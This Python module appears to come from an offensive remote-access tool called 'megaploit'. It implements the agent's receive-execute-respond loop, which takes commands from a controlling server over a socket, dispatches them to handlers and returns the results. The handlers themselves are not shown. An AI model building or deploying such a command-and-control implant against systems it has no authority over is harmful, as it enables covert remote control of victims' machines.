"""
megaploit.agent.shell
~~~~~~~~~~~~~~~~~~~~~
The main receive-execute-respond loop run by the agent after authentication.
"""

from __future__ import annotations

import contextlib
import socket

from megaploit.core.protocol import send_msg, recv_msg
from megaploit.agent.handlers import handle


def run_shell(conn: socket.socket) -> None:
    """Block until the server sends 'exit' or the connection drops."""
    while True:
        try:
            cmd = recv_msg(conn)
        except (ConnectionError, OSError):
            break

        if cmd == "exit":
            break

        try:
            response = handle(conn, cmd)
            if response is not None:
                send_msg(conn, response)
        except (ConnectionError, OSError):
            break
        except Exception as e:
            with contextlib.suppress(Exception):
                send_msg(conn, f"[-] Internal error: {e}")
